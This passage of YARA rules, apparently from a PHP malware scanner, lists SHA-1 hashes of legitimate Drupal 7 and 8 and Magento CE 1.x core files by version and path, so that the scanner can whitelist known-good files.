        hash.sha1(0, filesize) == "2b6073b216fb7d5d7ef3465d50e596fc2b6a70ff" or // includes/theme.inc
        hash.sha1(0, filesize) == "89a541888f21d7af626236301ac1f9ae26170e99" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "664d80035143128c50e60bf8396b0b64e62630df" or // modules/node/node.module
        hash.sha1(0, filesize) == "f3b335d92b224f2edc24ad4127c711dbb04df928" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "e3652334ff49ca8032c20a6a32ba6f11eef0af36" or // modules/image/image.module
        hash.sha1(0, filesize) == "5f2e0a670d73bc49a851beeecd2785465664ea7b" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "bdf2b5b33ff442c52017b42e051037dc8b8ce2fa" or // modules/user/user.install

        /* Drupal 7.24 */
        hash.sha1(0, filesize) == "7ab41616f021e4adf111d5680c4c42e029d4948f" or // includes/file.inc
        hash.sha1(0, filesize) == "ae60c814d2cc28baa49e61c7756d0120ef9a728b" or // modules/color/color.module

        /* Drupal 7.25 */
        hash.sha1(0, filesize) == "03b78bcb97010644d79316c3e8d193b50eadf5bf" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "7c0343c14a377faa35bb23e647854f69f4db8218" or // includes/database/query.inc
        hash.sha1(0, filesize) == "af993137f64bfafa4eca1436ab75a2fe8b56cf8f" or // includes/file.inc
        hash.sha1(0, filesize) == "6adee901d4e90e467b331b65a17fbb63a158d201" or // modules/locale/locale.test
        hash.sha1(0, filesize) == "9213eaff09673a2880bca63e3468b53582998181" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "0091ce1a78ad86c100b0fe1e9eeb5fbf53c9c441" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "04e080495f15a6b82b85de9e9897e77e070a4d6b" or // modules/node/node.module
        hash.sha1(0, filesize) == "bac2e33d5cd286c3ffa1bdbfa3aeb5f5ea40e7d7" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "7ff35df8ba2ca76304675d0938e39c2f2f8b9397" or // modules/image/image.module

        /* Drupal 7.28 */
        hash.sha1(0, filesize) == "9a03817a3f21758efd21015e5970f52150931629" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "225b56c05112c540df593bf5fc445c34f21d02db" or // includes/file.inc
        hash.sha1(0, filesize) == "f6db3d23187231bf064baba905186f72c9432252" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "70223710b73c315d1efc4626e7fdd791316ca597" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "0be77ea88557cdf53af7e18c43d68fa5c021f012" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "111e775db99adb9f9478205c3752f968f328a79a" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "34308cbe2ed163534f3b7f867833a2fee8cab163" or // modules/node/node.module
        hash.sha1(0, filesize) == "3b6d9c3db3a7cbebe343a4fd8bfe08fba7a96c36" or // modules/comment/comment.module

        /* Drupal 7.29 */
        hash.sha1(0, filesize) == "0ff5f28b5e0e639d24a2c488f97ded8baf51a9dd" or // includes/file.inc

        /* Drupal 7.30 */
        hash.sha1(0, filesize) == "cfad32d1ec605aa499eec8dc1922c2cd3cad8b46" or // modules/system/system.api.php

        /* Drupal 7.31 */
        hash.sha1(0, filesize) == "29f04965884c8ab2d11f9fd17224a9297b325c0c" or // includes/xmlrpc.inc

        /* Drupal 7.32 */
        hash.sha1(0, filesize) == "a28eb745deebf8a0b557a7acf29886016db68095" or // modules/simpletest/tests/database_test.test

        /* Drupal 7.33 */
        hash.sha1(0, filesize) == "a5a32dbda3cff7d92dfd7345a1d0bfdde388ce87" or // includes/locale.inc
        hash.sha1(0, filesize) == "cec9caac43b728cf84b873c1c534fde1a154d01a" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "649901b834dae9410b945c5a49e8c95d750e713c" or // includes/file.inc
        hash.sha1(0, filesize) == "152c09b9a21b75766ced086dac7231f89061ca13" or // includes/database/pgsql/schema.inc
        hash.sha1(0, filesize) == "19c45985dfee7dc27a3a275542dee7c8fc7ebd6d" or // modules/simpletest/drupal_web_test_case.php
        hash.sha1(0, filesize) == "9867145895dd79c48dab1a3382cb27ed24ea9e23" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "52019f747f744297f17e0f7012a80f8342a16fdc" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "108d5ebef4963fabe342b078a5c209a3175b9099" or // modules/simpletest/tests/theme.test
        hash.sha1(0, filesize) == "0fab9151adf3f689db7a74ce88595a49b01a6c91" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "d2a0a40abf9f252c64e370c9e8682a90039c3746" or // includes/theme.inc
        hash.sha1(0, filesize) == "e4a92eda6a80b64f755217d4ffe41912511610b5" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "e970494cc4a61aa7aed3878f46ee7d628a5e9172" or // modules/node/node.module
        hash.sha1(0, filesize) == "9476e22cde10bde2258f95cd10ad180b5e5af6fa" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "d6cc1f41b9e9dd76236513e584eeb287b6f3c73f" or // modules/image/image.module
        hash.sha1(0, filesize) == "7493b9f78dea9f379fc0b32769859debae47e003" or // includes/database/sqlite/schema.inc

        /* Drupal 7.36 */
        hash.sha1(0, filesize) == "611ded868095f236e0a259bfde372d9f4b469a48" or // includes/locale.inc
        hash.sha1(0, filesize) == "76fb1a3b18da5c1168a719bc636106071621dc4e" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "00e4591f606022cc086341399bf2a1abb264c6e6" or // includes/database/query.inc
        hash.sha1(0, filesize) == "e129b0c980d4ee0143717e334fc094a042dab464" or // includes/file.inc
        hash.sha1(0, filesize) == "09c81d96da6a426c447bc685f1aaef2cff26d3f3" or // modules/locale/locale.test
        hash.sha1(0, filesize) == "24e84aa41c3bebde17f5802439a73477952828be" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "0a86785b7bc285066911536562b8b4c38ca163b6" or // modules/image/image.module
        hash.sha1(0, filesize) == "a1021de42e0f6f2b6d90579154f4d7651e48b3dc" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "d53477366c6fd64a25d6777cc3bfb34f4038a39e" or // modules/simpletest/tests/theme.test
        hash.sha1(0, filesize) == "6a4553e36e499a2d348cf6a9c010d51e0e0bcf06" or // includes/theme.inc
        hash.sha1(0, filesize) == "3ed3f905448dd8d59cc0ca9a82ee02f40435c15e" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "db7a1eec1651683d78dcc8c3d3d0a842e71a2466" or // modules/node/node.module
        hash.sha1(0, filesize) == "ec81a47e662f903b233e0017cb7d876a7af4849f" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "ad7587ce735352b6a55526005c05c280e9d41822" or // modules/system/system.admin.inc
        hash.sha1(0, filesize) == "93d5259804a022d3a595482dae8b628506915ae4" or // modules/user/user.install

        /* Drupal 7.37 */
        hash.sha1(0, filesize) == "dfa67a40daeb9c1dd28f3fab00097852243258ed" or // modules/system/system.module
        hash.sha1(0, filesize) == "921a9d9d1e3da2b2ca6556003cbc7344729b875e" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "c74d2d4c3d15d5a5b233f79a5ba26030261c4560" or // modules/node/node.module

        /* Drupal 7.39 */
        hash.sha1(0, filesize) == "5bdafc679453dac010f3d200bf60e1723b060563" or // modules/simpletest/tests/database_test.test

        /* Drupal 7.40 */
        hash.sha1(0, filesize) == "5ad23ac95682c3e02e0679c662afe2ab4dc9225b" or // includes/locale.inc
        hash.sha1(0, filesize) == "9b21dd9b1ef24590e8e727c7e06c93acd53653f9" or // includes/file.inc
        hash.sha1(0, filesize) == "1ddde3edf851513b4e87438fa074fe71514cb7a5" or // modules/image/image.module
        hash.sha1(0, filesize) == "65e0cdf7b98ab9a02f1edd98e34e978814c4b397" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "9b6324f437401cc9484d4af0d41a7b6837a83097" or // includes/update.inc
        hash.sha1(0, filesize) == "ee4b12df28ea4349eaa2dd334a187b1cb2bc108f" or // includes/theme.inc
        hash.sha1(0, filesize) == "d3fe04a5f7fe23d1333525334431ed897fbc9c17" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "ca5f964f5ca7eac379f5e4848faead66103b2ba0" or // modules/node/node.module

        /* Drupal 7.42 */
        hash.sha1(0, filesize) == "6ced2c3aafcd17b69d72fb0c6d7a01da16be8d9e" or // modules/image/image.module
        hash.sha1(0, filesize) == "e58f7bcd263e38e6101da654a505fb42dc821705" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "aed7b175e86ba70e75d7b0eb184f07ce8fb4afb0" or // includes/theme.inc
        hash.sha1(0, filesize) == "59810b9f4ea730462c172ee8b7eae08da2b4dbe3" or // modules/node/node.module

        /* Drupal 8.0.0 */
        hash.sha1(0, filesize) == "7753d6142afc9f7df56c3f90aa715c3c71d68f65" or // core/scripts/transliteration_data.php.txt
        hash.sha1(0, filesize) == "8f6dcca398f17d7fc9e9fa43b24ad134f349aa13" or // core/modules/filter/filter.module
        hash.sha1(0, filesize) == "ed182aaa40ae08427fac885a22dbd18556bdd0a9" or // core/modules/system/src/Tests/Theme/TwigDebugMarkupTest.php
        hash.sha1(0, filesize) == "241803b9ce7dc45ddb117e2b637753be71bce856" or // core/tests/Drupal/Tests/Component/Utility/CryptTest.php
        hash.sha1(0, filesize) == "15f5c3913cbf70ae110c69126141f784bc31d1d6" or // vendor/guzzlehttp/guzzle/src/Handler/StreamHandler.php
        hash.sha1(0, filesize) == "11acd095e5aac5b66592f80b1c53e471dda458fa" or // core/lib/Drupal/Core/Database/Driver/pgsql/Schema.php
        hash.sha1(0, filesize) == "ff6b6fc1219047d4ecd51713eea7bcf6877f07f4" or // core/modules/image/src/Tests/ImageStylesPathAndUrlTest.php
        hash.sha1(0, filesize) == "ff850f37457b81677f7ad4d5e96f180dc4efbd8c" or // vendor/twig/twig/lib/Twig/Profiler/Dumper/Html.php
        hash.sha1(0, filesize) == "67c8d48238c085aa5a69a45c2849a9cbd27dab90" or // core/modules/filter/src/Plugin/Filter/FilterHtml.php
        hash.sha1(0, filesize) == "0629f5a202ca921fcc0efad4e87192ab868a85b7" or // core/lib/Drupal/Core/Database/Driver/sqlite/Schema.php
        hash.sha1(0, filesize) == "c3d3a752ac41853573491999c967e9d2f3bf9bba" or // core/lib/Drupal/Core/Database/Query/Condition.php
        hash.sha1(0, filesize) == "c05c86dda9ee0a4fca279336628c66f01e7c3d55" or // core/includes/file.inc
        hash.sha1(0, filesize) == "2945e559212b15a7a689e102655122a8732cf891" or // vendor/guzzlehttp/guzzle/src/HandlerStack.php
        hash.sha1(0, filesize) == "5da6eb43a06886882ad212322fec8c413bbfe07e" or // core/tests/Drupal/Tests/Core/EventSubscriber/ActiveLinkResponseFilterTest.php
        hash.sha1(0, filesize) == "c84192069328ba0643be42e6c7cf635dd9599df6" or // core/lib/Drupal/Core/Routing/UrlGenerator.php
        hash.sha1(0, filesize) == "e1af8525946c0784f1c3e18163ea1ae7f5ff0f38" or // vendor/twig/twig/lib/Twig/Profiler/Dumper/Text.php
        hash.sha1(0, filesize) == "514b2d7e438a37911d198c0af8efa52707734b01" or // core/modules/simpletest/src/TestBase.php
        hash.sha1(0, filesize) == "2cc7fdc4b71072cc62a2183f59ca002384a85020" or // core/lib/Drupal/Component/EventDispatcher/ContainerAwareEventDispatcher.php
        hash.sha1(0, filesize) == "5aa782930e47af64c4953333069d3af316aac65c" or // core/modules/node/node.api.php
        hash.sha1(0, filesize) == "61bb3ecd3ae1ad4178c418787765ae89bae07583" or // core/lib/Drupal/Core/Theme/ThemeManager.php
        hash.sha1(0, filesize) == "abfc22a32cc507308e7be802481b941e5a8bf7a2" or // vendor/guzzlehttp/promises/src/Promise.php
        hash.sha1(0, filesize) == "a4acb1dd03d580981f6fee26e0059879ffad8091" or // core/includes/update.inc
        hash.sha1(0, filesize) == "8954260cbb93f46da59cff358c824679395664c2" or // vendor/twig/twig/lib/Twig/Node/CheckSecurity.php
        hash.sha1(0, filesize) == "b4e5c38a4dba9c2a00d69e42a6796859c5fd09e9" or // core/lib/Drupal/Component/Utility/Color.php
        hash.sha1(0, filesize) == "b417813eb1334792ce2dd9441810dfd538965ffc" or // core/modules/views/views.api.php

        /* Drupal 8.0.2 */
        hash.sha1(0, filesize) == "784060b6f32a11c2bd460e787e9bdcc5064d4b9b" or // core/modules/filter/filter.module
        hash.sha1(0, filesize) == "784e6588f345342345fa8eb060f4f8b47d70bd11" or // core/lib/Drupal/Core/Database/Driver/pgsql/Schema.php
        hash.sha1(0, filesize) == "86236e39416f20c37ec26aa0c33d7e5736ab603f" or // core/lib/Drupal/Core/Routing/UrlGenerator.php
        hash.sha1(0, filesize) == "b5e81d65bfcec0a06cb37223b53cb3500a4c4c45" or // core/modules/simpletest/src/TestBase.php
        hash.sha1(0, filesize) == "3beac5f97e3031e48797a0731e75aec8b619b5c3" or // core/lib/Drupal/Core/Theme/ThemeManager.php
        hash.sha1(0, filesize) == "1c6dba82be1f7eff0fe75afd0bd2775b1efb7857" or // core/scripts/run-tests.sh

        /* Drupal 8.0.3 */
        hash.sha1(0, filesize) == "1bb3291430e0c41019200c53efdf4b6f5a269227" or // core/modules/filter/src/Plugin/Filter/FilterHtml.php
        hash.sha1(0, filesize) == "c26e101151020b63f0bd199d50bc10c5a8114cb4" or // sites/default/default.settings.php
        hash.sha1(0, filesize) == "d38a1297436cd7488db6f35c1e3c65e591fe2daa" or // core/scripts/run-tests.sh

        /* Drupal 8.0.5 */
        hash.sha1(0, filesize) == "854a8b01da0fa52f484453cce6efac16678066d0" or // core/modules/filter/filter.module
        hash.sha1(0, filesize) == "dc99435e1fd9209bcc8e218bb24ba5d3bff4d744" or // core/lib/Drupal/Core/Routing/UrlGenerator.php
        hash.sha1(0, filesize) == "476755f642a71fdadbc964d1401ba25f3a6246cb" or // core/modules/node/node.api.php
        hash.sha1(0, filesize) == "321c3fb11e0c029c1f765545713c0a222a3b28e0" or // sites/default/default.settings.php
        hash.sha1(0, filesize) == "323849dc02380489a19e316be93faf60444737d5" or // core/modules/views/views.api.php

        /* Drupal 8.0.6 */
        hash.sha1(0, filesize) == "51de351fd612d0c864783acd9497c41fa4a096d0"    // core/scripts/run-tests.sh

}
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/
import "hash"
private rule Magento1Ce : ECommerce
{
	condition:
		/* Magento CE 1.1.1 */
		hash.sha1(0, filesize) == "743c76e95b3849137c6b5552b568fa3c780c46f6" or // downloader/Maged/Pear.php
		hash.sha1(0, filesize) == "382cace9be19b080426456e4c984730c8ffbebf3" or // downloader/pearlib/php/System.php
		hash.sha1(0, filesize) == "7e0bab1294ba48689824a21e065d9643695e9f3c" or // downloader/pearlib/php/pearmage.php
		hash.sha1(0, filesize) == "f14a60868f4a51ee998e5e53de8bcffeecfaa56e" or // downloader/pearlib/php/pearcmd.php
		hash.sha1(0, filesize) == "174d2e99fbd72d9c11021e4650f2295fdf638083" or // downloader/pearlib/php/PEAR.php
		hash.sha1(0, filesize) == "f70bdefded327939aaa420b317e3bc15907cec3b" or // downloader/pearlib/php/PEAR/Registry.php
		hash.sha1(0, filesize) == "33c0a85ca6fa3a068656c404d9fcae90d687a399" or // downloader/pearlib/php/PEAR/Config.php
		hash.sha1(0, filesize) == "1c9b78e26352d32eaeb913579fb7789c2c9f567b" or // downloader/pearlib/php/PEAR/DependencyDB.php
		hash.sha1(0, filesize) == "f8bd96af3ec71ba5c4134d363cc50a209b9aef75" or // app/code/core/Mage/GoogleCheckout/Block/Adminhtml/Shipping/Merchant.php
		hash.sha1(0, filesize) == "64bb826dd3bebbc228731e7997e157678acae8a9" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "4a0efdf2ad68ae8f602b53b82451171e65f82c09" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "d81f736df877f9126e4b55d1576e6f4fc932187e" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "bd99da4961c6fdd32b613a0038f6795d6810258f" or // app/code/core/Mage/Core/Model/Convert/Profile.php
		hash.sha1(0, filesize) == "1f3f1c184b3d1bdfe5243305320ce65a240f0485" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Category.php
		hash.sha1(0, filesize) == "b6c0294bc06354096936ba415a973e7e7b596c1a" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "8a1291211cbdcc17b26fd41b60a67eb0c35d25be" or // app/code/core/Mage/Directory/Model/Mysql4/Currency.php
		hash.sha1(0, filesize) == "fcfdc0cb032200b95bdf177c0b50041e02c49d23" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
		hash.sha1(0, filesize) == "888454d2cea4ee1e53c60eee13b0454397d39c22" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "a0d304e026db4b836f3fbc71a6e77bc470f1b07c" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "c574ef276266161c851696615ae77b9f7a1a1b43" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "aeb3f5e823029465cbb7c3edbf84180bc0889952" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "5e3470d274cd5b2e279ac978ded8f220772df0be" or // app/code/core/Zend/Cache/Backend/File.php
		hash.sha1(0, filesize) == "0ccb0666a924e7c5167256e1b0751a0427ab2098" or // lib/LinLibertineFont/LinLibertineC_Re-2.8.0.ttf
		hash.sha1(0, filesize) == "b50d4664c1a7789fe6826a16a4970d65e51dc3fa" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "67386af90cbdb52a40ae5e458e2c7ac4688eddd2" or // lib/Varien/Data/Form/Element/Date.php
		hash.sha1(0, filesize) == "29012eb0dfee3e1b32ec76d433357b8c545540e7" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "c4a0b1abe86508dde3ffaaf1731796586d3b2333" or // lib/Varien/Data/Form/Element/Editor.php
		hash.sha1(0, filesize) == "0367960b396fbc2db3654ecf6dac52e89788d117" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "b40603ca11ce90532da0a853d45120e00e6de413" or // lib/Varien/Db/test.php
		hash.sha1(0, filesize) == "aae982ba3996eda190fa0c734f15f07253c1e51e" or // lib/Varien/Db/Tree.php
		hash.sha1(0, filesize) == "f9b9451b6c78160d889ecf1ba48020a6c17872b2" or // lib/Zend/View/Helper/HeadScript.php
		hash.sha1(0, filesize) == "7477aa9fe2d3f24e7d32a53e3588dda01ee5fe26" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "8b92c7a7efc45174190dcb65b07beddf9e4d7153" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "4ce8e354e898f9c8986dbc9326a672b3312f6c69" or // lib/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "7d0c4da4d1eade1f6c6633ade14121ab10c56d9f" or // lib/Zend/Cache/Backend/File.php
		
		/* Magento CE 1.1.2 */
		hash.sha1(0, filesize) == "05943fb7d0b4d698f6e4369e601254efb3fb00ef" or // lib/LinLibertineFont/LinLibertine_Bd-2.8.1.ttf
		
		/* Magento CE 1.1.3 */
		
		/* Magento CE 1.1.4 */
		
		/* Magento CE 1.1.5 */
		hash.sha1(0, filesize) == "a08c529465cbfdd88eff785e55487419a35041e5" or // downloader/Maged/Pear.php
		hash.sha1(0, filesize) == "7da9ee530dd22d47e4adc7f9cfe4bd5f31f8d426" or // app/code/core/Mage/GoogleCheckout/Block/Adminhtml/Shipping/Merchant.php
		hash.sha1(0, filesize) == "c0286fe2fd26330143cfc53b984cf543ea4284b9" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "ee55c97ab67e3c220d2138dcb4b7f795ed424e57" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "56750037b5fb0beba3541a6405d46684235619ca" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "35d6542180b2d89477d2923151e755e2c438c06c" or // app/code/core/Mage/Core/Model/Convert/Profile.php
		hash.sha1(0, filesize) == "cf2450914ca13e60d30dacd243c9e4962785ff0b" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Category.php
		hash.sha1(0, filesize) == "e6c2bd60400cae9b30095328ec9d378af98d8bd9" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "450c9c35b69b5cdbfd82378247f2bd5e06c102ee" or // app/code/core/Mage/Directory/Model/Mysql4/Currency.php
		hash.sha1(0, filesize) == "055bc24efb7da2740bf3e50e25fa91ac193b4f4c" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
		hash.sha1(0, filesize) == "8c3922d6b86d2d783cb68775a3eb1ca91bfa6ffb" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "b53329d05fefd512edc86f9a11c50e1f10b7543f" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "f87abb261a2dcc9b163314e47939fb89859574d1" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Field.php
		hash.sha1(0, filesize) == "a84f4c6b83a61dab0db37730b0f938b4e8473330" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "cbb147789c7072f587890b8332dad9bed063bb2d" or // lib/Varien/Data/Form/Element/Date.php
		hash.sha1(0, filesize) == "0159b4c43eae084bedbadc494d1298e3e181f4b0" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "44c3494ba9233407b0a5476d6cf9dc1eabd0f28a" or // lib/Varien/Data/Form/Element/Editor.php
		hash.sha1(0, filesize) == "6f259b077f88ad086b64a48a6fa0d0b40bd2a899" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "1061b92949e6c336246b5020d39be60ece155d63" or // lib/Varien/Db/Tree.php
		
		/* Magento CE 1.1.6 */
		
		/* Magento CE 1.1.7 */
		hash.sha1(0, filesize) == "df23a41ed1e7996020489270e90a4aa2aa2be89d" or // downloader/Maged/Pear.php
		hash.sha1(0, filesize) == "ede3de4e1f73a6d047e7086d8317e06a6bf3be50" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "9cf1ea4c8cf4bc5e0b3a73a918d87c7663472c83" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "d7e5697b32e415f4db5f3fcc1d329577732a71c6" or // lib/Varien/Data/Form/Element/Image.php
		
		/* Magento CE 1.1.8 */
		
		/* Magento CE 1.2.0 */
		hash.sha1(0, filesize) == "d6ebc6b2915ee40734da5ca750ed522cb85dd1a7" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "277fdd2ebdaef4ed69caf17f5c416f1fc84a236c" or // app/code/core/Mage/Core/Model/Translate/Inline.php
		hash.sha1(0, filesize) == "37e38312a8883e404e1e810187cb42bb4eee3fa4" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "2760412ac71dc87364adc8ddd74c10913e9bd9e1" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "98357e8621dcd97741535e97ce2d8d9a72853985" or // lib/Zend/View/Helper/HeadScript.php
		hash.sha1(0, filesize) == "286cf3a6569addf0ae4caba845cd94b9c0378158" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "f504a4747192d5428651979295780563491c3c3b" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "a16d202e41bae23330e0c110d5c211bb57ec0d87" or // lib/Zend/Service/ReCaptcha/MailHide.php
		hash.sha1(0, filesize) == "b606b94b19adba03b88b50567f59aae56ef2f91b" or // lib/Zend/Session/Exception.php
		hash.sha1(0, filesize) == "c22e09c85f4be958350c7f08a2570d3c3c1d4650" or // lib/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "4cf814ec9721da591eb5ca2861eddb80cecc90d5" or // lib/Zend/Cache/Backend/File.php
		
		/* Magento CE 1.2.0.1 */
		
		/* Magento CE 1.2.0.2 */
		
		/* Magento CE 1.2.0.3 */
		hash.sha1(0, filesize) == "125119cd8cb47404d310f10216749983bba7591f" or // app/code/core/Mage/GoogleCheckout/Block/Adminhtml/Shipping/Merchant.php
		
		/* Magento CE 1.2.1 */
		hash.sha1(0, filesize) == "695c700689f7cfdb21ac04a91bed0d39088a381b" or // app/code/core/Mage/Core/Model/Translate.php
		
		/* Magento CE 1.2.1.1 */
		
		/* Magento CE 1.2.1.2 */
		
		/* Magento CE 1.3.0 */
		hash.sha1(0, filesize) == "f4e7a4fd12b9975e64ee9e11791cce63c30aedf7" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "ffdc0c6eb436576f8b68fe40279301ce133b562c" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "5fea618cc39851ff46dea7f25e29fb3b3e0498cf" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "62bff1028824ec8ac0b46cbf492a5fbebe400b08" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		
		/* Magento CE 1.3.1 */
		hash.sha1(0, filesize) == "b3c2e7755a0d2b5c75f918397a5ed7f6feea5577" or // lib/PEAR/SOAP/Transport.php
		hash.sha1(0, filesize) == "4b66586bfa75b202e9227ac784a8ff9629005201" or // lib/PEAR/SOAP/Transport/HTTP.php
		
		/* Magento CE 1.3.1.1 */
		
		/* Magento CE 1.3.2 */
		hash.sha1(0, filesize) == "d7d4f3d1931ee90f7d820d1a754dbeb5e969adc0" or // downloader/pearlib/php/System.php
		hash.sha1(0, filesize) == "7fc1f9a57e67ceb0c1208e15374ce3799bfeccf2" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "c3d1caf978ce50359052d09e1d017814bab8bce2" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "893280bc8bcf75b65e2a59b60df8afcabfb7e4e5" or // app/code/core/Mage/Adminhtml/Block/Catalog/Product/Edit/Tab/Options/Option.php
		hash.sha1(0, filesize) == "c09844900dade96dea89ce6a8b2a7454c3a5c331" or // app/code/core/Zend/Cache/Backend/File.php
		hash.sha1(0, filesize) == "94e01fee6209e3bbd9034af7c83a630d6cc1e664" or // lib/Varien/Autoload.php
		
		/* Magento CE 1.3.2.1 */
		
		/* Magento CE 1.3.2.2 */
		hash.sha1(0, filesize) == "082fd7a80bef30aca4e8d8ae4b1a9f9f6ae78dab" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Category.php
		hash.sha1(0, filesize) == "7d83812c0d978f2b4a4703e211476b855f20b5e9" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "958de36312c048d2c00aa78c5ea46a8ef48b3a32" or // app/code/core/Mage/Directory/Model/Mysql4/Currency.php
		hash.sha1(0, filesize) == "7395a693295b54c4299f3393a479302b57a0d31a" or // app/code/core/Mage/Adminhtml/Block/System/Config/Form/Fieldset.php
		hash.sha1(0, filesize) == "d9bf44dbad9dafa0ea5976628eec3c15bf82b16d" or // lib/Varien/Autoload.php
		
		/* Magento CE 1.3.2.3 */
		
		/* Magento CE 1.3.2.4 */
		
		/* Magento CE 1.3.3.0 */
		
		/* Magento CE 1.4.0.0 */
		hash.sha1(0, filesize) == "7f2002909dd18f949f4ce314e4eb88cfd7cfe995" or // app/code/core/Mage/GoogleCheckout/Block/Adminhtml/Shipping/Merchant.php
		hash.sha1(0, filesize) == "2addd217a3550aee35337810ed0e1827cfe0b759" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "b1a0974f819869bf60687f8138037c1533c005d4" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "e7b2cbeb82280d159a14f56004a9bd57a27c69b5" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "74f315376c667e8663667b43ae01d5f4438a1cae" or // app/code/core/Mage/Core/Model/Convert/Profile.php
		hash.sha1(0, filesize) == "55070101ed51ba9b710a133d443bf06690cc0a3a" or // app/code/core/Mage/Core/Model/Translate/Inline.php
		hash.sha1(0, filesize) == "e47990d40d3dc59cb50fbb8880a8cf7d4f78a291" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Category.php
		hash.sha1(0, filesize) == "6108e7ed98fed4f1056be8cecc85b3199be13a4d" or // app/code/core/Mage/Sitemap/Model/Mysql4/Catalog/Product.php
		hash.sha1(0, filesize) == "75418233be7d2e5641ccd436b71d9fe7421c10bd" or // app/code/core/Mage/Directory/Model/Mysql4/Currency.php
		hash.sha1(0, filesize) == "0ee9b3a1a41e2d000dbfea245fc048b0996ff1f5" or // app/code/core/Mage/Catalog/Block/Product/View/Options/Type/Select.php
